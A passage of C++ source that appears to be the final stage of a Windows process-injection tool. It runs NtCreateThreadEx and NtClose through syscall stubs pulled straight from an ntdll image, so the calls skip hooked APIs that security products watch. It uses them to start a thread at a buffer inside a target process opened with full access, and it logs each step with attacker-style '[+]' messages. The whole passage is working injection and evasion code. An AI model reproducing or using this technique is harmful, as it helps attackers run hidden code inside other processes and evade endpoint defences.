    // if (step == 3) {
    //     // Open the process with the PID passed by the command line argument
    //     processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    //     if (processHandle == NULL) {
    //         printf("[-] Failed to open the process with PID: %lu.\n", pid);
    //         return -1; // or appropriate error handling
    //     }
    //     printf("[+] Process with PID %lu opened.\n", pid);
    // }


    HANDLE threadHandle;

    if (step == -1 || step == 3) {

        if(step == 3) {
            printf("[*] ATTENTION: step 3, Sifu will strike the 3rd blow! \n");
        }   

        myNtCreateThreadEx NtCreateThread = (myNtCreateThreadEx)(LPVOID)syscallStub;
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

        // arguments needed for NtAllocateVirtualMemory
        // HANDLE threadHandle;


        if (GetSyscallStub("NtCreateThreadEx", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
            printf("[+] Memory location of NtCreateThreadEx syscall stub outwith EAT: %p\n", (void*)NtCreateThread);
            status = NtCreateThread(&threadHandle, THREAD_ALL_ACCESS, nullptr, processHandle, reinterpret_cast<PVOID>(remoteBuffer), nullptr, FALSE, 0, 0, 0, nullptr);
            if (status != STATUS_SUCCESS) {
                printf("[-] NtCreateThreadEx failed.\n");
                return -1;
            }
            printf("[+] NtCreateThreadEx succeeded.\n");
            printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
        } else {
            printf("[-] Failed to execute NtCreateThreadEx.\n");
        }

        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
        WaitForSingleObject(threadHandle, INFINITE);
    }
    ///*********************************************************************************

    if (step == -1 || step == 3) {

        // close handle:
        myNtClose NtCloseHandle = (myNtClose)(LPVOID)syscallStub;
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);


        if (GetSyscallStub("NtClose", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
            printf("[+] Memory location of NtClose syscall stub outwith EAT: %p\n", (void*)NtCloseHandle);
            status = NtCloseHandle(threadHandle);
            if (status != STATUS_SUCCESS) {
                printf("[-] NtCreateThreadEx failed.\n");
                return -1;
            }
            printf("[+] NtClose succeeded.\n");
            printf("[+] thread handle: %IX\n", (SIZE_T)threadHandle);
        } else {
            printf("[-] Failed to execute NtClose.\n");
        }
    }

    // Change the protection of the syscall stub back to its original protection
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    printf("[+] Successful!");
    Sleep(155000);
    CloseHandle(processHandle);


    return 0;




}
